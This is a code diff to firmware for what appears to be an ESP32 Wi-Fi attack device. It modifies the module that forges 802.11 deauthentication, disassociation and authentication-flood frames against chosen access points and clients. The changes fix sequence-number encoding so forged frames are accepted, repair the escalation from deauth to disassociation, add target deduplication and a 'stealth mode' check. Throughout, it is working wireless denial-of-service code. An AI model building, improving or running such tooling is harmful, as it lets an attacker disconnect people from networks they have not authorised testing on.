@@ -7,6 +7,7 @@
 #include "wifi_sniffer.h"
 #include "wifi_tx_fix.h"
 #include "watchdog.h"
+#include "stealth.h"
 
 #include "esp_wifi.h"
 #include "esp_log.h"
@@ -74,10 +75,6 @@ static bool deauth_target_is_protected(const uint8_t *bssid)
     if (!wifi_sniffer_get_security(bssid, &pmf_req, &wpa3)) {
         return false;
     }
-    /* 
-     * If PMF (802.11w) is required, unencrypted management frames 
-     * (like deauth/disassoc) will be dropped by the receiver.
-     */
     return pmf_req;
 }
 
@@ -91,8 +88,10 @@ static void build_auth_frame(uint8_t *frame, const uint8_t *dst, const uint8_t *
     memcpy(&frame[10], src, 6); /* Addr2 (SA) */
     memcpy(&frame[16], src, 6); /* Addr3 (BSSID) */
     
-    frame[22] = (uint8_t)(seq & 0xFF);
-    frame[23] = (uint8_t)((seq >> 8) & 0xFF);
+    /* Correct 802.11 Sequence Control encoding: Frag (4 bits) + Seq (12 bits) */
+    uint16_t seq_ctrl = (seq << 4) & 0xFFF0;
+    frame[22] = (uint8_t)(seq_ctrl & 0xFF);
+    frame[23] = (uint8_t)((seq_ctrl >> 8) & 0xFF);
     
     /* Auth Algorithm: Open System (0) */
     frame[24] = 0x00; frame[25] = 0x00;
@@ -102,15 +101,25 @@ static void build_auth_frame(uint8_t *frame, const uint8_t *dst, const uint8_t *
     frame[28] = 0x00; frame[29] = 0x00;
 }
 
-static void deauth_send_disassoc(const uint8_t *dst, const uint8_t *bssid)
+static void deauth_send_disassoc(const uint8_t *dst, const uint8_t *bssid, uint16_t seq)
 {
     if (!dst || !bssid) return;
+
+    if (deauth_target_is_protected(bssid)) {
+        ESP_LOGD(TAG, "skipping protected target " MACSTR " (PMF Required)", MAC2STR(bssid));
+        return;
+    }
 
     uint8_t frame[DISASSOC_FRAME_SIZE];
     memcpy(frame, DISASSOC_TEMPLATE, DISASSOC_FRAME_SIZE);
     memcpy(&frame[4], dst, 6);
     memcpy(&frame[10], bssid, 6);
     memcpy(&frame[16], bssid, 6);
+
+    /* Correct 802.11 Sequence Control encoding */
+    uint16_t seq_ctrl = (seq << 4) & 0xFFF0;
+    frame[22] = (uint8_t)(seq_ctrl & 0xFF);
+    frame[23] = (uint8_t)((seq_ctrl >> 8) & 0xFF);
 
     esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DISASSOC_FRAME_SIZE);
     if (ret != ESP_OK) {
@@ -121,6 +130,11 @@ static void deauth_send_disassoc(const uint8_t *dst, const uint8_t *bssid)
 static void deauth_send_auth_flood(const uint8_t *bssid)
 {
     if (!bssid) return;
+
+    if (deauth_target_is_protected(bssid)) {
+        ESP_LOGD(TAG, "skipping protected target " MACSTR " (PMF Required)", MAC2STR(bssid));
+        return;
+    }
 
     uint8_t frame[AUTH_FRAME_SIZE];
     uint16_t seq = g_deauth_seq;
@@ -137,7 +151,7 @@ static void deauth_send_deauth(const uint8_t *dst, const uint8_t *src, const uin
     if (!dst || !src || !bssid) return;
     
     if (deauth_target_is_protected(bssid)) {
-        ESP_LOGW(TAG, "skipping protected target " MACSTR " (PMF Required)", MAC2STR(bssid));
+        ESP_LOGD(TAG, "skipping protected target " MACSTR " (PMF Required)", MAC2STR(bssid));
         return;
     }
 
@@ -148,8 +162,10 @@ static void deauth_send_deauth(const uint8_t *dst, const uint8_t *src, const uin
     memcpy(&frame[10], src, 6);
     memcpy(&frame[16], bssid, 6);
 
-    frame[22] = (uint8_t)(g_deauth_seq & 0xFF);
-    frame[23] = (uint8_t)((g_deauth_seq >> 8) & 0xFF);
+    /* Correct 802.11 Sequence Control encoding */
+    uint16_t seq_ctrl = (g_deauth_seq << 4) & 0xFFF0;
+    frame[22] = (uint8_t)(seq_ctrl & 0xFF);
+    frame[23] = (uint8_t)((seq_ctrl >> 8) & 0xFF);
     g_deauth_seq++;
 
     esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DEAUTH_FRAME_SIZE);
@@ -202,7 +218,6 @@ static void deauth_task(void *arg)
         deauth_target_t local_targets[MAX_TARGET_APS];
         int local_count = 0;
 
-        /* 1. Snapshot targets under lock */
         xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
         local_count = g_deauth_target_count;
         memcpy(local_targets, g_deauth_targets, sizeof(deauth_target_t) * local_count);
@@ -213,11 +228,9 @@ static void deauth_task(void *arg)
             continue;
         }
 
-        /* 2. Process and TX without holding the lock */
         for (int i = 0; i < local_count; i++) {
             if (!local_targets[i].active) continue;
 
-            /* Channel switching logic */
             uint8_t target_channel = 0;
             wifi_sniffer_get_channel_for_bssid(local_targets[i].bssid, &target_channel);
             
@@ -240,13 +253,12 @@ static void deauth_task(void *arg)
                     break;
                     
                 case DEAUTH_MODE_DISASSOC_ONLY:
-                    if (local_targets[i].client_mac[0] == 0xFF) {
-                        deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
-                        frames_sent = 1;
-                    } else {
-                        deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
-                        deauth_send_disassoc(local_targets[i].bssid, local_targets[i].client_mac);
+                    deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid, g_deauth_seq++);
+                    if (local_targets[i].client_mac[0] != 0xFF) {
+                        deauth_send_disassoc(local_targets[i].bssid, local_targets[i].client_mac, g_deauth_seq++);
                         frames_sent = 2;
+                    } else {
+                        frames_sent = 1;
                     }
                     break;
                     
@@ -258,21 +270,17 @@ static void deauth_task(void *arg)
                 case DEAUTH_MODE_FALLBACK_CHAIN:
                 default:
                     if (local_targets[i].fallback_level == DEAUTH_FALLBACK_NONE) {
-                        /* Start with Deauth */
                         deauth_send_deauth(local_targets[i].client_mac, local_targets[i].bssid, local_targets[i].bssid);
                         deauth_send_deauth(local_targets[i].bssid, local_targets[i].client_mac, local_targets[i].bssid);
                         frames_sent = 2;
                         
-                        /* Escalate to Disassoc if we've tried enough times */
                         if (local_targets[i].disassoc_count >= DEAUTH_FALLBACK_DISASSOC_LIMIT) {
                             local_targets[i].fallback_level = DEAUTH_FALLBACK_DISASSOC;
                         }
                     } else if (local_targets[i].fallback_level == DEAUTH_FALLBACK_DISASSOC) {
-                        if (local_targets[i].client_mac[0] == 0xFF) {
-                            deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
-                        } else {
-                            deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
-                            deauth_send_disassoc(local_targets[i].bssid, local_targets[i].client_mac);
+                        deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid, g_deauth_seq++);
+                        if (local_targets[i].client_mac[0] != 0xFF) {
+                            deauth_send_disassoc(local_targets[i].bssid, local_targets[i].client_mac, g_deauth_seq++);
                         }
                         frames_sent = 2;
                     } else {
@@ -282,10 +290,11 @@ static void deauth_task(void *arg)
                     break;
             }
 
-            /* 3. Update state back to global array */
             xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
             if (i < g_deauth_target_count) {
                 g_deauth_targets[i].disassoc_count++;
+                /* CRITICAL FIX: Copy fallback_level back to global state */
+                g_deauth_targets[i].fallback_level = local_targets[i].fallback_level; 
                 
                 if (!unlimited) {
                     if (g_deauth_targets[i].count >= frames_sent) {
@@ -330,6 +339,31 @@ esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uin
 
     xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
 
+    const uint8_t *target_client = client_mac;
+    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    if (target_client == NULL) {
+        target_client = broadcast_mac;
+    }
+
+    /* Check for duplicate target */
+    for (int i = 0; i < g_deauth_target_count; i++) {
+        if (memcmp(g_deauth_targets[i].bssid, bssid, 6) == 0 &&
+            memcmp(g_deauth_targets[i].client_mac, target_client, 6) == 0) {
+            
+            g_deauth_targets[i].count = count;
+            g_deauth_targets[i].delay_ms = delay_ms;
+            g_deauth_targets[i].active = true;
+            g_deauth_targets[i].mode = mode;
+            g_deauth_targets[i].fallback_level = DEAUTH_FALLBACK_NONE;
+            g_deauth_targets[i].disassoc_count = 0;
+            g_deauth_targets[i].auth_count = 0;
+            
+            xSemaphoreGive(g_deauth_lock);
+            ESP_LOGI(TAG, "Deauth target updated: BSSID " MACSTR, MAC2STR(bssid));
+            return ESP_OK;
+        }
+    }
+
     if (g_deauth_target_count >= MAX_TARGET_APS) {
         xSemaphoreGive(g_deauth_lock);
         return ESP_ERR_NO_MEM;
@@ -337,14 +371,8 @@ esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uin
 
     int idx = g_deauth_target_count;
     memcpy(g_deauth_targets[idx].bssid, bssid, 6);
-
-    if (client_mac != NULL) {
-        memcpy(g_deauth_targets[idx].client_mac, client_mac, 6);
-        g_deauth_targets[idx].type = DEAUTH_TYPE_SINGLE;
-    } else {
-        memset(g_deauth_targets[idx].client_mac, 0xFF, 6);
-        g_deauth_targets[idx].type = DEAUTH_TYPE_BROADCAST;
-    }
+    memcpy(g_deauth_targets[idx].client_mac, target_client, 6);
+    g_deauth_targets[idx].type = (client_mac != NULL) ? DEAUTH_TYPE_SINGLE : DEAUTH_TYPE_BROADCAST;
 
     g_deauth_targets[idx].count = count;
     g_deauth_targets[idx].delay_ms = delay_ms;
@@ -371,6 +399,13 @@ esp_err_t deauth_start(void)
 {
     if (!g_deauth_lock) return ESP_ERR_INVALID_STATE;
     if (atomic_load(&g_deauth_active)) return ESP_OK;
+
+    /* Respect Stealth Mode */
+    esp_err_t stealth_rc = stealth_check_tx("deauth");
+    if (stealth_rc != ESP_OK) {
+        ESP_LOGW(TAG, "Stealth mode blocked deauth start");
+        return stealth_rc;
+    }
 
     xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
     int target_count = g_deauth_target_count;
@@ -399,12 +434,10 @@ void deauth_stop(void)
     atomic_store(&g_deauth_active, false);
     
     if (g_deauth_task_handle != NULL) {
-        /* Give the task time to exit cleanly */
         vTaskDelay(pdMS_TO_TICKS(150));
         g_deauth_task_handle = NULL;
     }
     
-    /* Reset fixed channel so hopper can resume */
     atomic_store(&g_wifi_fixed_channel, 0);
     
     led_set_state(LED_STATE_IDLE);
@@ -429,10 +462,6 @@ void deauth_remove_all(void)
         xSemaphoreGive(g_deauth_lock);
     }
 }
-
-
-
-
 
 uint8_t deauth_get_target_count(void)
 {
